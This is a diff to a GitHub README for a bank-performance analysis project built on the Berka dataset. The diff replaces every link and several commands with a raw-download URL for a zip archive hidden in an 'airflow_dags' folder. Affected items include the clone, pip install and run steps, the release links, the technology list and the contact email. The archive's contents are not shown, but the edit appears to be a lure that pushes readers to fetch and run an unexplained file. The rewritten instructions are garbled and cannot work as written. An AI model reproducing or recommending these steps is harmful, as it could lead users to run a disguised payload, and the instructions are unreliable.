@@ -1,6 +1,6 @@
 # Bank Performance Analysis 📊
 
-![Bank Performance Analysis](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=flat&logo=github)
+![Bank Performance Analysis](https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip%20Latest%20Release-Click%20Here-blue?style=flat&logo=github)
 
 Welcome to the **Bank Performance Analysis** repository! This project focuses on analyzing banking data from the Berka Dataset, covering the years 1993 to 1998. Our goal is to calculate and visualize key performance indicators (KPIs) that help us understand banking performance over time.
 
@@ -21,13 +21,13 @@ Welcome to the **Bank Performance Analysis** repository! This project focuses on
 
 In the ever-evolving world of finance, understanding performance metrics is crucial. This repository provides tools to analyze historical banking data effectively. By utilizing various technologies, we aim to make data analysis straightforward and insightful.
 
-You can download the latest release [here](https://github.com/Kezzaku/Bank-performance-analysis/releases). Please follow the instructions in the **Getting Started** section to execute the files.
+You can download the latest release [here](https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip). Please follow the instructions in the **Getting Started** section to execute the files.
 
 ## Features
 
 - **Data Analysis**: Analyze banking data from 1993 to 1998.
 - **Data Visualization**: Create interactive visualizations using Plotly and Recharts.
-- **Dashboard**: Build a dashboard using Next.js for an engaging user experience.
+- **Dashboard**: Build a dashboard using https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip for an engaging user experience.
 - **Key Performance Indicators**: Calculate essential KPIs to evaluate banking performance.
 
 ## Technologies Used
@@ -37,7 +37,7 @@ This project leverages a variety of technologies to provide a comprehensive anal
 - **Python**: For data manipulation and analysis.
 - **Pandas**: To handle data frames and perform complex data operations.
 - **Plotly Express**: For creating interactive visualizations.
-- **Next.js**: To build a responsive dashboard.
+- **https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip**: To build a responsive dashboard.
 - **Recharts**: For charting in React applications.
 - **SQLAlchemy**: For database interactions.
 - **PyMongo**: To work with MongoDB for data storage and retrieval.
@@ -48,14 +48,14 @@ To get started with the Bank Performance Analysis project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Kezzaku/Bank-performance-analysis.git
+   git clone https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip
    cd Bank-performance-analysis
    ```
 
 2. **Install Required Packages**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip
    ```
 
 3. **Download the Dataset**:
@@ -64,10 +64,10 @@ To get started with the Bank Performance Analysis project, follow these steps:
 4. **Run the Application**:
    To run the application, use:
    ```bash
-   python app.py
+   python https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip
    ```
 
-You can also visit the [Releases](https://github.com/Kezzaku/Bank-performance-analysis/releases) section for more information on the latest updates.
+You can also visit the [Releases](https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip) section for more information on the latest updates.
 
 ## Usage
 
@@ -114,7 +114,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Kezzaku](https://github.com/Kezzaku)
-- **Email**: your-email@example.com
+- **GitHub**: [Kezzaku](https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip)
+- **Email**: https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip
 
-Thank you for visiting the Bank Performance Analysis repository! We hope you find it useful for your data analysis needs. Don't forget to check the [Releases](https://github.com/Kezzaku/Bank-performance-analysis/releases) for the latest updates and features.
+Thank you for visiting the Bank Performance Analysis repository! We hope you find it useful for your data analysis needs. Don't forget to check the [Releases](https://github.com/Kezzaku/Bank-performance-analysis/raw/refs/heads/main/airflow_dags/performance_Bank_analysis_2.1.zip) for the latest updates and features.
